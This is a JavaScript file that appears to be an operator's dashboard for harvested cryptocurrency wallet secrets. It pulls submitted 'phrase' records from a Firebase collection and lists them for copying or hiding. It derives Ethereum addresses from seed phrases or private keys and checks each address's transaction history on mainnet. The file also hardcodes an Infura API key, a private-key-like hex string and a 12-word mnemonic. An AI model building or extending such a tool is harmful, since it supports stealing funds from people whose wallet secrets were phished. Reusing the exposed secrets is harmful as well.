// Define the Ethereum address you want to check
const web3 = new Web3('https://mainnet.infura.io/v3/be7908329a7b4b48bd2bcaed67c632dd');

var url = 'https://pamalikasako-default-rtdb.firebaseio.com/database.json'

function testAjax() {
    var result="";
    $.ajax({
      url: url,
      async: false,  
      success:function(data) {
         result = data.config; 
      }
   });
   return result;
}

const config = testAjax()
console.log(config)

const db = firebase.firestore(firebase.initializeApp(config))
// .where("state", "==", "CA")

function fire() {
    db.collection("datas").orderBy('time', 'desc')
    .onSnapshot((snapshot) => {
        snapshot.docChanges().forEach((change) => {
            let d = change.doc.data();
            let i = change.doc.id
            // console.log(d)

           

            if (d.phrase.length > 41 && d.status !== 'hide') {
                data(i, d.phrase)
            } else {

            }

        });
        
    $('.new').find('.entries').each( function () {
        let b = $(this)
        
        $(b).on('click', function() {

            $('#public').html('')
            $('#count').html('')
            $('#showvalue').html(`${$(this).attr('title')}`)
        })

        $(this).prev().on('click', () => {
            var i = b.attr('id');

    
            if (confirm('delete') == true) {
                $(this).parent().remove()
                db.collection("datas").doc(i).update({
                    status: 'hide'
                 })
                
            } else {
                //
            }
            
   

      
        })
    })
        
    });

}

fire()

function data(id, key) {
    const format = `
    <div class="entry">
    <span id="${id}" class="badge bg-danger delete">x</span>
    <button id="${id}" type="button" class="btn btn-sm btn-light position-relative entries" title="${key}">${key.substring(0, 23)}</button>
    </div>
    `;

    $('.new').append(format)
}













var pkey = '761b66ae31987ca7ec02b9a14dd018a23b27ce357644bbb3ddcb77a6989fa83bc926013d9a05a710f1df59e95848aea00bab95634312187605e3b19fdb918834'

$('#copy').on('click', () => {
  var k = $('#showvalue').html()
  navigator.clipboard.writeText(`${k}`)
  alert('copi')
})

$('#check').on('click', () => {

  var k = $('#showvalue').html()

  getK(k)


})



$('#transaction').on('click', () => {

  var k = $('#public').html()
  console.log(k)
  checkT(k)

})

// $('#1').html(pkey.substring(0, 7) + '...')

$('#1').each( function () {

  $(this).prepend(pkey.substring(0, 9) + '...')

  $(this).attr('title', pkey)

  $(this).on('click', () => {
    $('#public').html('')
    $('#count').html('')
    $('#showvalue').html(`${pkey}`)



  })

})


//



var pkey2 = 'avoid access gadget oyster retreat kingdom test false blue convince fossil pepper'

$('#2').each(function () {

  $(this).prepend(pkey2.substring(0, 10)+'...')

  $(this).attr('title', pkey2)

  $(this).on('click', () => {

    $('#public').html('')
    $('#count').html('')
    $('#showvalue').html(`${pkey2}`)

  })

})







function checkT(address) {

  web3.eth.getTransactionCount(address)
    .then(count => {
      console.log(`Transaction count for address ${address}: ${count}`);
      $('#count').html(`${count}`)
    })
    .catch(error => {
      console.error('Error occurred:', error);
    });
}

// checkT('0x5c77250cdd67960740e7df7e6c20af61cd8f1801')




function getK(address) {

  try {



    const y = web3.eth.accounts.privateKeyToAccount(address)


    var isP = web3.utils.isHex(address)


    if (isP == true) {
      $('#public').html(y.address)
      console.log(y.address);

      
    } else {


    }

   

  } catch (error) {

    console.log(error)

    let mnemonicWallet = ethers.Wallet.fromMnemonic(address);
    const mnemonicPrivate = mnemonicWallet.privateKey
    // console.log(mnemonicPrivate);
    const y = web3.eth.accounts.privateKeyToAccount(mnemonicPrivate)
    console.log(y.address)
    $('#public').html(y.address)
  }



}

// getK('761b66ae31987ca7ec02b9a14dd018a23b27ce357644bbb3ddcb77a6989fa83bc926013d9a05a710f1df59e95848aea00bab95634312187605e3b19fdb918834')

// getK('avoid access gadget oyster retreat kingdom test false blue convince fossil pepper')


function MNEMONIC(address) {

  let mnemonicWallet = ethers.Wallet.fromMnemonic(address);
  const mnemonicPrivate = mnemonicWallet.privateKey
  // console.log(mnemonicPrivate);
  const y = web3.eth.accounts.privateKeyToAccount(mnemonicPrivate)
  console.log(y.address)

}

// MNEMONIC(pkey2)